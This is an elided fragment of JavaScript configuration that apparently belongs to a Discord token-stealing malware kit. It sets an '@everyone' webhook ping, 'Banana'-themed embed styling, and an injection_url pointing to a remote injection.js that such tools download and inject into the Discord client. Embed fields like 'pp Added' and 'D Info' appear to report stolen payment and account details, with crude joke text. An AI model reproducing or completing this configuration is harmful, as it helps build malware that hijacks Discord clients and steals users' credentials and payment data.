...
const config = {
  ...
  ping_val: '@everyone',
  embed_name: 'Banana', 
  embed_icon: 'https://fruitfortheoffice.co.uk/media/catalog/product/cache/499ba5c50dfd581f0f648734c0101dc2/b/a/banana_each_500x500_.png', 
  embed_color: 2895667, 
  injection_url: 'https://github.com/AtomBread/bruh/raw/main/injection.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
            text: 'Banana go brrrrr',
            icon_url: "https://fruitfortheoffice.co.uk/media/catalog/product/cache/499ba5c50dfd581f0f648734c0101dc2/b/a/banana_each_500x500_.png"
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**pp Added**',
            value: `Time to fart some B baby 😩`,
            inline: false,
          },
          {
            name: '**D Info**',
